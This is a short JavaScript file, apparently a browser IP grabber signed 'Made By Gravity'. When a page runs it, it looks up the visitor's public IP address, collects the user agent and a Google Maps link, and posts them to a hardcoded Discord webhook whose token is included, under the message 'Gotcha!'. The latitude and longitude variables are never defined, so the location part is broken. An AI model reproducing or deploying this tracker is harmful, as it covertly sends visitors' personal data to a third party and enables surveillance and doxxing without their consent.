const webhook = 'https://canary.discord.com/api/webhooks/1260862582902751414/4W3LOGZ2QWEQzsJSpukZYhZ3C6ecfSxUZoqSxgJ8q-4QDwW9DylyVuIQjfJPP9VN1Gyk';

const request = async () => {
  try {
    const ipResponse = await fetch('https://api.ipify.org/?format=json');
    const ipData = await ipResponse.json();
    const ip = ipData.ip;

    const userAgent = navigator.userAgent;
    let isVPN = false;
    if (typeof VPNConn !== 'undefined' && VPNConn.connection_type === 'Corporate') {
      isVPN = true;
    }
    const googleMapsLink = `https://www.google.com/maps/place/${latitude},${longitude}`;

    const message = {
      username: 'By Gravity',
      avatar_url: 'https://www.discordavatars.com/wp-content/uploads/2020/05/hacker-avatar-023.jpg',
      embeds: [
        {
          title: 'User Info',
          description: 'Gotcha! Here is the detailed info about the user 👀',
          fields: [
            {
              name: 'IP Address',
              value: ip,
            },
            {
              name: 'User Agent',
              value: userAgent,
            },
            {
              name: 'Google Maps Link',
              value: `[Click Here](${googleMapsLink})`,
            },
            {
              name: 'VPN Detected',
              value: isVPN ? ':white_check_mark: Yes' : ':x: No',
            },
          ],
          footer: {
            text: 'Made By Gravity',
          },
        },
      ],
    };

    fetch(webhook, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(message),
    })
      .then(() => {
        console.log('Message sent successfully!');
      })
      .catch((error) => {
        console.error('Error while sending the message:', error);
      });
  } catch (error) {
    console.error('Error:', error);
  }
};

request();
